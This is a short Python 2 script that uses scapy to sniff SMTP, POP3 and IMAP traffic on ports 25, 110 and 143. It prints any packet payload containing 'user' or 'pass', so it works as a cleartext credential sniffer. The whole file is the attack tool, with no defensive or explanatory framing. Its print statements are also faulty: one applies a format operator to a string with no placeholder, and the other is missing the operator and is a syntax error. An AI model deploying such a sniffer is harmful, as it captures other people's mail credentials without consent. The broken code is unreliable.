#!/usr/bin/env python
"""

@author : 'Muhammad Arslan <rslnrkmt2552@gmail.com>'

"""

from scapy.all import *

def packet_callback(packet):
    if packet[TCP].payload:

        mail_packet = str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print "[*] Server: " % packet[IP].dst
            print "[*] %s" packet[TCP].payload

sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)